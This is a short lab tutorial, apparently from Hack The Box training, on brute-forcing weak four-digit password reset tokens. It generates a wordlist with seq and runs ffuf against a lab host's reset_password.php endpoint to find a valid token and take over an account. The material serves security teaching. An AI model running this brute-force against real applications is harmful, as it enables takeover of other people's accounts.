## Identifying Weak Reset Tokens

![](Brute-Forcing%20Password%20Reset%20Tokens-20260914-083443.png)

To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it to determine its strength. In this example, let us assume we have received the following password reset email:

```txt
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this email.

Thank you.
```
## Attacking Weak Reset Tokens

```sh
3kjS@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

The `-w` flag pads all numbers to the same length by prepending zeroes, which we can verify by looking at the first few lines of the output file:

```sh
3kjS@htb[/htb]$ head tokens.txt

0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
```

We can then specify the wordlist in `ffuf` to brute-force all active reset-tokens:

```sh
3kjS@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"

<SNIP>

[Status: 200, Size: 2667, Words: 538, Lines: 90, Duration: 1ms]
    * FUZZ: 6182
```

By specifying the reset token in the GET parameter `token` in the `/reset_password.php` endpoint, we can reset the password of the corresponding account, enabling us to take over the account:

![](Brute-Forcing%20Password%20Reset%20Tokens-20260914-083632.png)
